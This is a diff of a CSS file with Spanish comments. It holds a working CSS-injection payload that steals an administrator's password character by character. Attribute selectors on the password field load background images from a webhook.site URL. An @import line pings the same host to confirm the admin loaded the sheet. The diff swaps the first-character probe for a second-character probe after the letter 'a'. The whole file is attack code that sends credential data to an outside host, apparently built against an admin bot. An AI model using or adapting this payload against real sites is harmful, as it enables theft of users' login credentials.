@@ -1,46 +1,40 @@
-/* Ping inicial para confirmar que el admin cargó el CSS */
-@import url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?hit=start);
+/* Ping inicial */
+@import url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?hit=second_char);
 
-/* ===== PRIMER CARÁCTER DEL PASSWORD ===== */
-input[name="password"][value^="a"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a); }
-input[name="password"][value^="b"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=b); }
-input[name="password"][value^="c"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=c); }
-input[name="password"][value^="d"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=d); }
-input[name="password"][value^="e"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=e); }
-input[name="password"][value^="f"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=f); }
-input[name="password"][value^="g"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=g); }
-input[name="password"][value^="h"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=h); }
-input[name="password"][value^="i"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=i); }
-input[name="password"][value^="j"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=j); }
-input[name="password"][value^="k"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=k); }
-input[name="password"][value^="l"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=l); }
-input[name="password"][value^="m"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=m); }
-input[name="password"][value^="n"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=n); }
-input[name="password"][value^="o"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=o); }
-input[name="password"][value^="p"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=p); }
-input[name="password"][value^="q"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=q); }
-input[name="password"][value^="r"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=r); }
-input[name="password"][value^="s"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=s); }
-input[name="password"][value^="t"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=t); }
-input[name="password"][value^="u"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=u); }
-input[name="password"][value^="v"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=v); }
-input[name="password"][value^="w"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=w); }
-input[name="password"][value^="x"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=x); }
-input[name="password"][value^="y"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=y); }
-input[name="password"][value^="z"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=z); }
-input[name="password"][value^="0"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=0); }
-input[name="password"][value^="1"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=1); }
-input[name="password"][value^="2"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=2); }
-input[name="password"][value^="3"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=3); }
-input[name="password"][value^="4"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=4); }
-input[name="password"][value^="5"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=5); }
-input[name="password"][value^="6"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=6); }
-input[name="password"][value^="7"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=7); }
-input[name="password"][value^="8"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=8); }
-input[name="password"][value^="9"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=9); }
-
-/* ===== PRIMEROS DOS CARACTERES DEL PASSWORD ===== */
+/* Segundo carácter del password (primer carácter ya es "a") */
 input[name="password"][value^="aa"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=aa); }
 input[name="password"][value^="ab"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ab); }
 input[name="password"][value^="ac"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ac); }
-/* ... repetís para todas las combinaciones que empiecen con la primera letra que descubriste */
+input[name="password"][value^="ad"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ad); }
+input[name="password"][value^="ae"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ae); }
+input[name="password"][value^="af"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=af); }
+input[name="password"][value^="ag"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ag); }
+input[name="password"][value^="ah"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ah); }
+input[name="password"][value^="ai"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ai); }
+input[name="password"][value^="aj"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=aj); }
+input[name="password"][value^="ak"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ak); }
+input[name="password"][value^="al"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=al); }
+input[name="password"][value^="am"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=am); }
+input[name="password"][value^="an"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=an); }
+input[name="password"][value^="ao"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ao); }
+input[name="password"][value^="ap"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ap); }
+input[name="password"][value^="aq"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=aq); }
+input[name="password"][value^="ar"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ar); }
+input[name="password"][value^="as"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=as); }
+input[name="password"][value^="at"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=at); }
+input[name="password"][value^="au"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=au); }
+input[name="password"][value^="av"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=av); }
+input[name="password"][value^="aw"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=aw); }
+input[name="password"][value^="ax"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ax); }
+input[name="password"][value^="ay"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=ay); }
+input[name="password"][value^="az"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=az); }
+input[name="password"][value^="a0"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a0); }
+input[name="password"][value^="a1"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a1); }
+input[name="password"][value^="a2"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a2); }
+input[name="password"][value^="a3"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a3); }
+input[name="password"][value^="a4"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a4); }
+input[name="password"][value^="a5"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a5); }
+input[name="password"][value^="a6"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a6); }
+input[name="password"][value^="a7"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a7); }
+input[name="password"][value^="a8"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a8); }
+input[name="password"][value^="a9"] { background-image:url(//webhook.site/b6cb053d-7966-4b37-b70a-907594c9d554?p=a9); }
